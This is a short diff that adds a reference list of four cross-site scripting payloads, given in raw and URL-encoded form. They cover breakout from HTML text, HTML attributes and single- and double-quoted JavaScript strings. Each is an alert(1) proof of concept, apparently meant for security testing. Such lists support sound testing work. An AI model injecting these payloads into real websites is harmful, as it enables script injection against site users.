@@ -1,0 +1,17 @@
+Raw payloads and URL-encoded equivalents
+
+1) HTML text context:
+   Raw: <script>alert(1)</script>
+   Enc: %3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+2) HTML attribute breakout:
+   Raw: "><img src=x onerror=alert(1)>
+   Enc: %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+3) JavaScript string (single-quoted):
+   Raw: ';alert(1);//
+   Enc: %27%3Balert(1)%3B%2F%2F
+
+4) JavaScript string (double-quoted):
+   Raw: ";alert(1);//
+   Enc: %22%3Balert(1)%3B%2F%2F
